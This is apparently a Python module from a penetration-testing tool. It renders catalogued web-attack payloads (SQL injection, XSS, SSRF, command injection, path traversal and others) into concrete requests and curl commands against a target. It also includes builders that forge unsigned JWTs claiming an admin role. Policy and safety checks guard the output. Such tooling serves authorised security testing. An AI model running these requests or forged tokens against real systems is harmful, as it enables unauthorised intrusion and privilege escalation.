"""Payload generation: catalogue -> concrete, ready-to-send requests."""

from __future__ import annotations

import base64
import json
from typing import Any
from urllib.parse import quote, urlparse

from pydantic import BaseModel, Field

from cyberpowerfull.errors import CyberpowerfullError, PolicyViolation
from cyberpowerfull.payloads.library import DEFAULT_MARKER, PAYLOADS, safety_report
from cyberpowerfull.payloads.models import Payload, SafetyReport

_JSON_CONTENT = "application/json"
_XML_CONTENT = "application/xml"

#: Operator-friendly aliases for the canonical skill names.
SKILL_ALIASES: dict[str, str] = {
    "sqli": "sql_injection",
    "sql": "sql_injection",
    "xss": "xss",
    "xxe": "xxe",
    "ssrf": "ssrf",
    "ssti": "ssti",
    "rce": "command_injection",
    "cmdi": "command_injection",
    "command-injection": "command_injection",
    "traversal": "path_traversal",
    "lfi": "path_traversal",
    "redirect": "open_redirect",
    "jwt": "jwt",
    "auth": "jwt",
    "idor": "idor",
    "mass-assignment": "mass_assignment",
    "cache": "cache_poisoning",
    "crlf": "crlf_injection",
    "api": "api_enumeration",
}


class RenderedPayload(BaseModel):
    """One ready-to-send request derived from a catalogue entry."""

    id: str
    skill: str
    technique: str
    context: str
    method: str
    url: str
    headers: dict[str, str] = Field(default_factory=dict)
    body: str | None = None
    value: str
    expected_signal: str
    note: str = ""
    curl: list[str] = Field(default_factory=list)

    def summary(self) -> str:
        target = f"{self.method} {self.url}"
        if self.body:
            target += f" body={self.body[:120]}"
        return f"[{self.skill}/{self.id}] {target} | expect: {self.expected_signal}"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def build_jwt_none(*, marker: str = DEFAULT_MARKER, subject: str = "admin") -> str:
    """Build an unsigned ``alg=none`` JWT carrying proof claims."""
    header = {"alg": "none", "typ": "JWT"}
    claims = {"sub": subject, "role": "admin", "marker": marker}
    encoded_header = b64url(json.dumps(header, separators=(",", ":")).encode())
    encoded_claims = b64url(json.dumps(claims, separators=(",", ":")).encode())
    return f"{encoded_header}.{encoded_claims}."


def build_jwt_empty_signature(*, marker: str = DEFAULT_MARKER, subject: str = "admin") -> str:
    """Build an HS256-labelled JWT with an empty signature segment."""
    header = {"alg": "HS256", "typ": "JWT"}
    claims = {"sub": subject, "role": "admin", "marker": marker}
    encoded_header = b64url(json.dumps(header, separators=(",", ":")).encode())
    encoded_claims = b64url(json.dumps(claims, separators=(",", ":")).encode())
    return f"{encoded_header}.{encoded_claims}."


_BUILDERS = {"jwt_none": build_jwt_none, "jwt_empty_signature": build_jwt_empty_signature}


def skills() -> tuple[str, ...]:
    return tuple(sorted({item.skill for item in PAYLOADS}))


def resolve_skill(name: str | None) -> str | None:
    """Map an alias to its canonical skill name; unknown names pass through."""
    if name is None:
        return None
    cleaned = name.strip().lower().replace(" ", "_")
    if cleaned in SKILL_ALIASES:
        return SKILL_ALIASES[cleaned]
    return cleaned


def select(
    skill: str | None = None,
    *,
    ids: list[str] | None = None,
    tags: list[str] | None = None,
    payloads: tuple[Payload, ...] = PAYLOADS,
) -> tuple[Payload, ...]:
    """Filter the catalogue by skill, explicit ids, and/or tags."""
    chosen = payloads
    if skill:
        canonical = resolve_skill(skill)
        chosen = tuple(item for item in chosen if item.skill == canonical)
    if ids:
        wanted = {item.upper() for item in ids}
        chosen = tuple(item for item in chosen if item.id.upper() in wanted)
    if tags:
        wanted_tags = {item.lower() for item in tags}
        chosen = tuple(item for item in chosen if wanted_tags & {t.lower() for t in item.tags})
    return chosen


def _build_url(payload: Payload, *, target: str, param: str, value: str) -> str:
    base = target.strip()
    if payload.mode == "path":
        if not value:
            return base
        suffix = value if value.startswith("/") else f"/{value}"
        return base.rstrip("/") + suffix
    if not value:
        return base
    separator = "&" if urlparse(base).query else "?"
    return f"{base}{separator}{param}={quote(value, safe='')}"


def render_payload(
    payload: Payload,
    *,
    target: str,
    param: str = "q",
    marker: str = DEFAULT_MARKER,
) -> RenderedPayload:
    """Turn one catalogue entry into a concrete request."""
    token = payload.contains_forbidden()
    if token is not None:
        raise PolicyViolation(f"payload {payload.id!r} contains forbidden token {token!r}")

    value = payload.render(marker=marker, param=param, target=target.rstrip("/"))
    if payload.builder:
        builder = _BUILDERS.get(payload.builder)
        if builder is None:  # pragma: no cover - catalogue/builder drift guard
            raise CyberpowerfullError(f"unknown payload builder: {payload.builder!r}")
        value = builder(marker=marker)

    headers: dict[str, str] = {}
    body: str | None = None
    url = target

    if payload.mode in {"query", "path"}:
        url = _build_url(payload, target=target, param=param, value=value)
    elif payload.mode == "header":
        header_name = payload.header or "X-Probe"
        headers[header_name] = f"Bearer {value}" if header_name == "Authorization" else value
    elif payload.mode == "body":
        body = value
        headers["Content-Type"] = (
            _JSON_CONTENT if value.lstrip().startswith(("{", "[")) else _XML_CONTENT
        )
    else:  # pragma: no cover - catalogue guard
        raise CyberpowerfullError(f"unsupported payload mode: {payload.mode!r}")

    curl = ["curl", "-sS", "-k", "-i", "-X", payload.method, url]
    for name, header_value in headers.items():
        curl.extend(["-H", f"{name}: {header_value}"])
    if body is not None:
        curl.extend(["--data-binary", body])

    return RenderedPayload(
        id=payload.id,
        skill=payload.skill,
        technique=payload.technique,
        context=payload.context,
        method=payload.method,
        url=url,
        headers=headers,
        body=body,
        value=value,
        expected_signal=payload.expected_signal,
        note=payload.note,
        curl=curl,
    )


def generate(
    skill: str | None = None,
    *,
    target: str,
    param: str = "q",
    marker: str = DEFAULT_MARKER,
    ids: list[str] | None = None,
    max_payloads: int = 5,
) -> list[RenderedPayload]:
    """Generate ready-to-send requests for a skill (or the whole catalogue)."""
    report = safety_report()
    report.require_clean()
    chosen = select(skill, ids=ids)
    if not chosen:
        raise CyberpowerfullError(
            f"no payloads for skill {skill!r}; known skills: {', '.join(skills())}"
        )
    limit = max(1, min(max_payloads, 50))
    return [
        render_payload(item, target=target, param=param, marker=marker) for item in chosen[:limit]
    ]


def catalog() -> list[dict[str, Any]]:
    return [
        {
            "id": item.id,
            "skill": item.skill,
            "technique": item.technique,
            "context": item.context,
            "mode": item.mode,
            "method": item.method,
            "expected_signal": item.expected_signal,
            "note": item.note,
        }
        for item in PAYLOADS
    ]


def audit() -> SafetyReport:
    return safety_report()


__all__ = [
    "DEFAULT_MARKER",
    "SKILL_ALIASES",
    "RenderedPayload",
    "audit",
    "b64url",
    "build_jwt_empty_signature",
    "build_jwt_none",
    "catalog",
    "generate",
    "render_payload",
    "resolve_skill",
    "select",
    "skills",
]
